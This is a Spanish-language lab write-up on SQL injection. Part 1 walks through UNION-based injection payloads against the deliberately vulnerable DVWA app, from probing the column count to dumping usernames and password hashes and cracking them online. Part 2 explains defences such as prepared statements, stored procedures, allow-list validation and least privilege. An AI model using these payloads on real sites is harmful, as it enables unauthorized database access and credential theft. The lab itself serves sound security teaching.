# 6.4.5 - Práctica de Laboratorio: Ataques de Inyección

## Objetivos
Los sitios web que están conectados a bases de datos backend pueden ser vulnerables a la inyección SQL. En un ataque de inyección SQL, un atacante ingresa consultas maliciosas que interactúan con la base de datos de la aplicación. En esta práctica de laboratorio se explotará una vulnerabilidad de un sitio web con inyección SQL y se investigará la mitigación de dicha inyección.<br>

- __Parte 1__: Explotar una vulnerabilidad de inyección SQL en DVWA
- __Parte 2__: Investigar la mitigación de la inyección SQL<br>

## Trasfondo / Escenario
La inyección SQL es un ataque común utilizado por los crackers para explotar las aplicaciones web basadas en bases de datos SQL. Este tipo de ataque implica la inserción de código SQL malicioso o instrucciones en un campo de entrada o URL con el objetivo de revelar o manipular el contenido de la base de datos, causar problemas de repudio en el sistema o falsificar identidades.<br>

## Recursos necesarios
- Máquina Virtual Kali Linux
- Acceso a Internet

## Parte 1: Explotar una vulnerabilidad de inyección SQL en DVWA
La inyección SQL es una técnica de inyección de código utilizada para explotar las vulnerabilidades de seguridad en la capa de base de datos de una aplicación. Estas vulnerabilidades podrían permitir que un atacante ejecute comandos SQL maliciosos y comprometa la seguridad de la base de datos.<br>
En esta parte, explotará una vulnerabilidad de SQL en DVWA.<br>

### Paso 1: Preparar DVWA para el ataque de inyección SQL
- Abra su navegador y navegue hasta DVWA en _http://10.6.6.13_
- Introduzca las credenciales: __admin / password__
- Establezca DVWA en Seguridad Baja
  - Haga clic en __DVWA Security__ en el panel izquierdo
  - Cambie el nivel de seguridad a __Low__ y haga clic en __Submit__<br>

### Paso 2: Verifique DVWA para ver si hay una vulnerabilidad de inyección SQL
- Haga clic en __SQL Injection__ en el panel izquierdo
- En el campo __User ID__ escriba ```' or 1=1 #``` y haga clic en __Submit__.
- Se obtiene la salida que se muestra a continuación. El resultado confirma que hay una vulnerabilidad que permite la ejecución de declaraciones SQL que se ingresan directamente en los campos de entrada.<br>

```
    ID: ' or 1=1 #
    First name: admin
    Surname: admin
 
    ID: ' or 1=1 #
    First name: Gordon
    Surname: Brown
 
    ID: ' or 1=1 #
    First name: Hack
    Surname: Me
 
    ID: ' or 1=1 #
    First name: Pablo
    Surname: Picasso
 
    ID: ' or 1=1 #
    First name: Bob
    Surname: Smith
```

Ha ingresado una expresión "siempre verdadera" (1=1) que fue ejecutada por el servidor de la base de datos. El resultado es que se devolvieron todas las entradas del campo ID de la base de datos.<br>

### Paso 3: Verifique la cantidad de campos en la consulta
- En el campo __User ID:__, escriba ```1' ORDER BY 1#``` y haga clic en __Submit__
- Se recibe el siguiente resultado:<br>

```
    ID: 1' ORDER BY 1#
    First name: admin
    Surname: admin
```

- En el campo __User ID:__, escriba ```1' ORDER BY 2#``` y haga clic en __Submit__
- Se recibe el siguiente resultado:

```
    ID: 1' ORDER BY 2#
    First name: admin
    Surname: admin
```

- En el campo __User ID:__, escriba ```1' ORDER BY 3#``` y haga clic en __Submit__
- Esta vez, se recibe el error __Unknown column '3' in 'order clause'__<br>
Dado que la tercera cadena devolvió un error, nos indica que la consulta implica solo dos campos. Esta es información útil para conocer mientras continúa con la explotación.<br>

### Paso 4: Verifique la versión del Sistema de Administración de Bases de Datos (DBMS)
En el campo __User ID:__, escriba ```1' OR 1=1 UNION SELECT 1, VERSION()#``` y haga clic en __Submit__
Se obtiene un resultado similar al siguiente:

```
    ID: 1' OR 1=1 UNION SELECT 1, VERSION()#
    First name: Pablo
    Surname: Picasso
 
    ID: 1' OR 1=1 UNION SELECT 1, VERSION()#
    First name: Bob
    Surname: Smith
 
    ID: 1' OR 1=1 UNION SELECT 1, VERSION()#
    First name: 1
    Surname: 5.5.58-0+deb8u1
```

La salida ``5.5.58-0 + deb8u1`` indica que el DBMS es MySQL versión 5.5.58, ejecutándose en Debian.<br>

### Paso 5: Determine el nombre de la base de datos
Hasta ahora, ha descubierto que la base de datos es vulnerable, la consulta implica dos campos y el DBMS es MySQL 5.5.58.<br>
A continuación, intentará obtener más información del esquema sobre la base de datos.<br>

En el campo __User ID:__, escriba ``1' OR 1=1 UNION SELECT 1, DATABASE()#`` y haga clic en __Submit__.<br>
Se obtiene el siguiente resultado:<br>

```
    ID: 1’ OR 1=1 UNION SELECT 1, DATABASE()#
    First name: 1
    Surname: dvwa
```

Eso significa que el nombre de la base de datos es __dvwa__.<br>

### Paso 6: Recupere la tabla Names de la base de datos dvwa
- En el campo __User ID:__, escriba ``1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#``
- Haga clic en __Submit__
- La salida con __First Name: 1__ es la información de la tabla

```
ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
First name: 1
Surname: guestbook

ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
First name: 1
Surname: users
```

- Se encontraron las tablas __guestbook__ y __users__, la tabla __users__ puede ser más interesante en una prueba de penetración porque puede incluir nombres de usuario y contraseñas.<br>

### Paso 7: Recupere los nombres de las columnas de la tabla users
Ahora descubrirá los nombres de campo en la tabla _users_. Esto le ayudará a encontrar información útil para el pentest.<br>
- En el campo __User ID:__, escriba ``1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#``
- Haga clic en __Submit__
La lista de nombres de columna se muestra después de la lista de cuentas de usuario en la salida. La información de la columna __user__ y la columna __password__ son de interés porque parecen contener información que puede usarse para accesos no autorizados.<br>

```
ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
First name: 1
Surname: user

ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
First name: 1
Surname: password
```

### Paso 8: Recupere las credenciales de usuario
Esta consulta recuperará los usuarios y las contraseñas.<br>
- En el campo __User ID:__, escriba ``1' OR 1=1 UNION SELECT user, password FROM users #``
- Haga clic en __Submit__
- Después de la lista de usuarios, debería ver varios resultados con nombres de usuario y lo que parecen ser hashes de contraseñas.<br>

```
ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: admin
Surname: admin

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: Gordon
Surname: Brown

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: Hack
Surname: Me

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: Pablo
Surname: Picasso

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: Bob
Surname: Smith

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' OR 1=1 UNION SELECT user, password FROM users #
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

- Podemos ver la cuenta de administrador, la cual podría ser la más valiosa debido a que probablemente tenga los mayores derechos y privilegios dentro del sistema.<br>
- Intente crear consultas para mostrar el contenido de otros campos en la tabla variando los nombres de las columnas según los nombres mostrados anteriormente.<br>
- La diferencia entre *user_id* y _user_ es que el campo *user_id* es el número de identificación del usuario, mientras que _user_ es el nombre del usuario.<br>

### Paso 9: Hackea los hashes de contraseñas
- Abra otra pestaña del navegador y ve a _https://crackstation.net_. Crackstation es un descifrador de hash de contraseñas en línea gratuito.
- Copie y pegue el hash de la contraseña de DVWA en CrackStation y haga click en __Crack Hashes__.<br>
- Podemos ver que __password__ es la contraseña de la cuenta de administrador. También, sacando el hash del usuario _pablo_, vemos que su contraseña es __letmein__.


## Parte 2: Investigar la mitigación de la inyección SQL

### ¿Qué es un ataque de inyección SQL?
Los atacantes pueden usar inyección SQL en una aplicación si esta tiene consultas dinámicas a la base de datos que usan concatenación de cadenas y entrada suministrada por el usuario. Para evitar fallos en la inyección SQL, los desarrolladores deben __dejar de escribir consultas dinámicas con concatenación de cadenas__ o __evitar que se incluyan entradas SQL maliciosas en consultas ejecutadas__.<br>
Existen técnicas sencillas para prevenir vulnerabilidades de inyección SQL y pueden usarse prácticamente con cualquier tipo de lenguaje de programación y cualquier tipo de base de datos. Aunque las bases de datos XML pueden tener problemas similares (por ejemplo, la inyección de XPath o XQuery), estas técnicas también pueden usarse para protegerlas.<br>

### Anatomía de una vulnerabilidad típica de inyección SQL
A continuación se muestra un fallo común en la inyección SQL en Java. Como su parámetro "``customerName``" no validado simplemente se añade en la consulta, un atacante puede introducir código SQL en esa consulta y la aplicación tomará el código del atacante y lo ejecutará en la base de datos.<br>

```Java
    String query = "SELECT account_balance FROM user_data WHERE user_name = " + request.getParameter("customerName");
    
    try {
        Statement statement = connection.createStatement( ... );
        ResultSet results = statement.executeQuery( query );
    }
```

### Defensas primarias
- __Opción 1__: Uso de sentencias preparadas (con consultas parametrizadas)
- __Opción 2__: Uso de procedimientos almacenados correctamente construidos
- __Opción 3__: Validación de entrada por lista de permisos
- __Opción 4 (FUERTEMENTE DESACONSEJADA)__: Escapar de toda entrada proporcionada por el usuario

### Opción de defensa 1: Declaraciones preparadas (con consultas parametrizadas)
Cuando se enseñe a los desarrolladores a escribir consultas de bases de datos, deberían decirles que usen sentencias preparadas con vinculación de variables (es decir, consultas parametrizadas). Las sentencias preparadas son fáciles de escribir y más fáciles de entender que las consultas dinámicas, y las consultas parametrizadas obligan al desarrollador a definir primero todo el código SQL y luego a pasar cada parámetro a la consulta.<br>
Si las consultas de base de datos usan este estilo de codificación, la base de datos siempre distinguirá entre código y datos, independientemente de la entrada que se proporcione por el usuario. Además, las sentencias preparadas aseguran que un atacante no pueda cambiar la intención de una consulta, incluso si el atacante inserta comandos SQL.<br>

#### Ejemplo de Instrucción Preparada Segura en Java
En el ejemplo de Safe Java que aparece a continuación, si un atacante introduce el ID de usuario como ``tom' or '1'='1 tom' or '1'='1``, la consulta parametrizada buscaría un nombre de usuario que coincidiera con toda la cadena. Así, la base de datos estaría protegida contra inyecciones de código SQL malicioso.<br>
El siguiente ejemplo de código utiliza una implementación de Java de una consulta parametrizada para ejecutar la misma consulta de base de datos.<br>

```Java
    // REALMENTE esto también debe ser validado 
    String custname = request.getParameter("customerName"); 
    // Realiza la validación de entrada para detectar ataques
    String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
    PreparedStatement pstmt = connection.prepareStatement( query );
    pstmt.setString( 1, custname);
    ResultSet results = pstmt.executeQuery( );
```

#### Ejemplo de instrucción preparada segura en C# .NET
En .NET, la creación y ejecución de la consulta no cambia. Solo los parámetros a la consulta usando la llamada ``Parameters.Add()`` como se muestra a continuación.

```CSharp
    String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";

    try {
        OleDbCommand command = new OleDbCommand(query, connection);
        command.Parameters.Add(new OleDbParameter("customerName", CustomerName Name.Text));
        OleDbDataReader reader = command.ExecuteReader();
        // ...
    } catch (OleDbException se) {
        // Manejo del error
    }
```

Aunque hemos visto ejemplos en Java y .NET, prácticamente todos los demas lenguajes (incluyendo _Cold Fusion_ y _Classic ASP_) soportan interfaces de consulta parametrizadas. Incluso las capas de abstracción de SQL, como el __Hibernate Query Language (HQL)__ con el mismo tipo de problemas de inyección (__HQL Injection__), también admiten consultas parametrizadas.<br>

#### Ejemplo de instrucción preparada en Hibernate Query Language (parámetros nombrados)

```Java
    // Esta es una declaración HQL insegura
    Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");
    // Esta es una versión segura de la misma consulta utilizando parámetros nombrados
    Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
    safeHQLQuery.setParameter("productid", userSuppliedParameter);
```

En general, a los desarrolladores les gustan las sentencias preparadas porque todo el código SQL permanece dentro de la aplicación, lo que hace que las aplicaciones sean relativamente independientes de la base de datos.<br>

### Opción de defensa 2: Procedimientos almacenados
Aunque los procedimientos almacenados no siempre están a salvo de la inyección SQL, los desarrolladores pueden utilizar ciertos constructos estándar de programación de procedimientos almacenados. Este enfoque tiene el mismo efecto que el uso de consultas parametrizadas, siempre que los procedimientos almacenados se implementen de forma segura.<br>

#### Enfoque seguro de procedimientos almacenados
Si se necesitan procedimientos almacenados, el enfoque más seguro para usarlos requiere que el desarrollador construya secuencias SQL con parámetros que se parametricen automáticamente, a menos que el desarrollador haga algo en gran medida fuera de lo habitual. La diferencia entre sentencias preparadas y procedimientos almacenados es que el código SQL de un procedimiento almacenado se define y almacena en la propia base de datos, y luego se llama desde la aplicación. Dado que las sentencias preparadas y los procedimientos almacenados son igualmente efectivos para prevenir la inyección SQL, deberías elegir el enfoque que tenga más sentido para ti.<br>

#### Cuando los procedimientos almacenados pueden aumentar el riesgo
Ocasionalmente, los procedimientos almacenados pueden aumentar el riesgo cuando un sistema es atacado. Por ejemplo, en MS SQL Server tienes tres roles principales por defecto: ``db_datareader``, ``db_datawriter`` y ``db_owner``. Antes de que los procedimientos almacenados entraran en uso, los DBA otorgaban derechos al usuario del servicio web dependiendo de los requisitos.<br>
Sin embargo, los procedimientos almacenados requieren derechos de ejecución, un rol que no está disponible por defecto. En algunas configuraciones donde la gestión de usuarios ha sido centralizada pero limitada a esos 3 roles, las aplicaciones web tendrían que ejecutarse para que los procedimientos almacenados funcionen. Naturalmente, eso significa que si un servidor es vulnerado, el atacante tiene todos los derechos sobre la base de datos, mientras que antes solo podía tener permisos de lectura.<br>

#### Ejemplo de procedimiento almacenado seguro en Java
El siguiente ejemplo de código utiliza la implementación de Java de la interfaz de procedimientos almacenados (``CallableStatement sp_getAccountBalance``) para ejecutar la misma consulta de base de datos. El procedimiento almacenado debe estar predefinido en la base de datos y utilizar la misma funcionalidad que la consulta anterior.<br>

```Java
    // Esto REALMENTE debe ser validado
    String custname = request.getParameter("customerName");
    try {
        CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
        cs.setString(1, custname);
        ResultSet results = cs.executeQuery();
        // ... Manejo del conjunto de resultados
    } catch (SQLException se) {
        // Registro y manejo del error
    }
```

#### Ejemplo de procedimiento almacenado seguro en Visual Basic .NET
El siguiente ejemplo de código utiliza una implementación de la interfaz de procedimientos almacenados de .NET para ejecutar la misma consulta de base de datos. El procedimiento almacenado debe estar predefinido en la base de datos y utilizar la misma funcionalidad que la consulta definida anteriormente.<br>

```VB
    Try
        Dim command As SqlCommand = new SqlCommand("sp_getAccountBalance", connection)
        command.CommandType = CommandType.StoredProcedure
        command.Parameters.Add(new SqlParameter("@CustomerName", CustomerName.Text))
        Dim reader As SqlDataReader = command.ExecuteReader()
        '...
    Catch se As SqlException
        'Manejo del error
    End Try
```

### Opción de defensa 3: Validación de entrada en listas de permisos
Si te enfrentas a partes de consultas SQL que no pueden usar variables de enlace, como nombres de tablas, nombres de columnas o indicadores de orden de clasificación (ASC o DESC), la validación de entrada o el rediseño de la consulta es la defensa más adecuada. Cuando se necesitan nombres de tablas o columnas, idealmente esos valores provienen del código y no de los parámetros del usuario.<br>

#### Ejemplo de validación de nombres de tablas seguros
__ADVERTENCIA__: Usar valores de parámetros de usuario para seleccionar nombres de tablas o columnas es un síntoma de mal diseño y debería considerarse una reescritura completa si el tiempo lo permite. Si eso no es posible, los desarrolladores deberían asignar los valores de los parámetros a los nombres legales o esperados de la tabla o columna para asegurarse de que la entrada de usuario no validada no acabe en la consulta.<br>
En el siguiente ejemplo, dado que se identifica como uno de los valores legales y esperados para un nombre de tabla en esta consulta, puede añadirse directamente a la consulta SQL. Ten en cuenta que las funciones genéricas de validación de tablas pueden provocar pérdida de datos si se usan nombres de tabla en consultas donde no se esperan.<br>

```Java
    String tableName;
    switch(PARAM):
        case "Value1": tableName = "fooTable";
            break;
        case "Value2": tableName = "barTable";
            break;
        default: throw new InputValidationException("unexpected value provided" + " for table name")
```

#### Uso más seguro de la generación dinámica de SQL (NO RECOMENDADO)
Cuando decimos que un procedimiento almacenado está "implementado de forma segura", significa que no incluye ninguna generación dinámica insegura de SQL. Los desarrolladores normalmente no generan SQL dinámico dentro de procedimientos almacenados. Sin embargo, se puede hacer, pero debe evitarse.<br>
Si no se puede evitar, el procedimiento almacenado debe usar la validación de entrada o el escape adecuado, para asegurarse de que toda la entrada suministrada por el usuario al procedimiento almacenado no pueda usarse para inyectar código SQL en la consulta generada dinámicamente. Los auditores siempre deben buscar usos de ``sp_execute`` o ``execute exec`` dentro de los procedimientos almacenados de SQL Server. Directrices de auditoría similares son necesarias para funciones similares en otros proveedores.<br>

#### Ejemplo de Generación Dinámica de Consultas Más Seguras (NO RECOMENDADO)
Para algo sencillo como un orden de ordenación, es mejor que la entrada suministrada por el usuario se convierta en un valor booleano, y luego ese booleano se utilice para seleccionar el valor seguro para añadir a la consulta. Esta es una necesidad muy estándar en la creación dinámica de consultas.<br>Por ejemplo:<br>

```Java
    public String someMethod(boolean sortOrder) {
        String SQLQuery = "some SQL ... order by Salary" + (sortOrder ? "ASC" : "DESC");
    }
```

En cualquier momento en que la entrada del usuario pueda convertirse en un no-String, esto garantiza que sea seguro antes de añadirse a una consulta o usarse para seleccionar un valor que añadir a la consulta.<br>
La validación de entrada también se recomienda como defensa secundaria en TODOS los casos, incluso cuando se usan variables de enlace.<br>

### Opción de defensa 4 (FUERTEMENTE DESACONSEJADA): Escapar de toda entrada proporcionada por el usuario
En este enfoque, el desarrollador evitará toda la entrada del usuario antes de incluirla en una consulta. Su implementación es muy específica de bases de datos. Esta metodología es frágil en comparación con otras defensas, y NO PODEMOS garantizar que esta opción evite todas las inyecciones SQL en todas las situaciones.<br>
Si una aplicación se construye desde cero o requiere baja tolerancia al riesgo, debe construirse o reescribirse usando consultas parametrizadas, procedimientos almacenados o algún tipo de __Mapeador Relacional de Objetos (ORM)__ que construya tus consultas por ti.<br>

### Defensas Adicionales
Además de adoptar una de las cuatro defensas principales, también recomendamos adoptar todas estas defensas adicionales para proporcionar una defensa en profundidad. Estas defensas adicionales son:
- __Privilegio Mínimo__
- __Validación de entrada por lista de permisos__

### Privilegio Mínimo
Para minimizar el posible daño de un ataque de inyección SQL exitoso, deberías minimizar los privilegios asignados a cada cuenta de base de datos en tu entorno. Empieza desde cero para determinar qué derechos de acceso requieren tus cuentas de aplicación, en lugar de intentar averiguar qué derechos necesitas quitar.<br>
Asegúrate de que las cuentas que solo necesitan acceso de lectura solo tengan acceso a las tablas a las que necesitan acceso. NO ASIGNES ACCESO DE TIPO DBA O ADMINISTRADOR A TUS CUENTAS DE APLICACIÓN. Entendemos que esto es fácil y que todo "funciona" cuando lo haces así, pero es muy peligroso.<br>

#### Minimización de privilegios de aplicaciones y sistemas operativos
La inyección SQL no es la única amenaza para los datos de tu base de datos. vLos atacantes pueden simplemente cambiar los valores de los parámetros de uno de los valores legales que se les presentan a un valor que no les permite, pero la aplicación podría estar autorizada para acceder. Por tanto, minimizar los privilegios concedidos a tu aplicación reducirá la probabilidad de intentos de acceso no autorizados, incluso cuando un atacante no intenta usar inyección SQL como parte de su exploit.<br>
Además, se deberían minimizar los privilegios de la cuenta del sistema operativo bajo la que se ejecuta el SGBD. __¡No ejecutes tu SGBD como root o sistema!__ La mayoría de los SGBD funcionan de fábrica con una cuenta de sistema muy potente. Por ejemplo, MySQL funciona como sistema en Windows por defecto, cambia la cuenta del sistema operativo del SGBD por algo más apropiado, con privilegios restringidos.<br>

#### Detalles del privilegio mínimo durante el desarrollo
Si una cuenta solo necesita acceso a partes de una tabla, considera crear una vista que limite el acceso a esa parte de los datos y asignar el acceso de la cuenta a la vista en lugar de a la tabla subyacente. Rara vez, si es que alguna vez, concede acceso a cuentas de bases de datos.<br>
Si adoptas una política en la que usas procedimientos almacenados en todas partes y no permites que las cuentas de aplicación ejecuten directamente sus propias consultas, entonces restringe esas cuentas para que solo puedan ejecutar los procedimientos almacenados que necesitan. No les concedas derechos directos sobre las tablas de la base de datos.<br>

#### Privilegios mínimos de administrador para múltiples bases de datos
Los diseñadores de aplicaciones web deberían evitar usar la misma cuenta de propietario/administrador en las aplicaciones web para conectarse a la base de datos. De este modo, el diseñador de la aplicación puede tener una buena granularidad en el control de acceso, reduciendo así los privilegios tanto como sea posible. Cada usuario de la base de datos tendrá entonces acceso selectivo solo a lo que necesite y acceso de escritura según sea necesario.<br>
Por ejemplo, una página de inicio de sesión requiere acceso de lectura a los campos de nombre de usuario y contraseña de una tabla, pero no acceso de escritura de ningún formulario. Sin embargo, la página de inscripción ciertamente requiere el privilegio de insertar en esa tabla; esta restricción solo puede aplicarse si estas aplicaciones web utilizan diferentes usuarios de bases de datos para conectarse a la base de datos.<br>

#### Mejorar el privilegio mínimo con vistas SQL
Puedes usar vistas SQL para aumentar aún más la granularidad del acceso limitando el acceso de lectura a campos específicos de una tabla o uniones de tablas. Podría tener beneficios adicionales.<br>
Por ejemplo, si el sistema está obligado a almacenar las contraseñas de los usuarios, en lugar de contraseñas hasheadas con sal, el diseñador podría usar vistas para compensar esta limitación. Podrían revocar todo acceso a la tabla y crear una vista que muestre el hash del campo de contraseña y no el campo en sí.<br>
Cualquier ataque de inyección SQL que consiga robar información de la base de datos estará restringido a robar el hash de las contraseñas (incluso podría ser un hash claveado), ya que ningún usuario de la base de datos de ninguna de las aplicaciones web tiene acceso a la tabla en sí.<br>

### Validación de entrada por lista de permisos
Además de ser una defensa principal cuando no es posible nada más, la validación de entrada también puede ser una defensa secundaria utilizada para detectar entradas no autorizadas antes de que se pase a la consulta SQL. Procede con precaución aquí. Los datos validados no son necesariamente seguros para insertar en consultas SQL mediante la creación de cadenas.<br>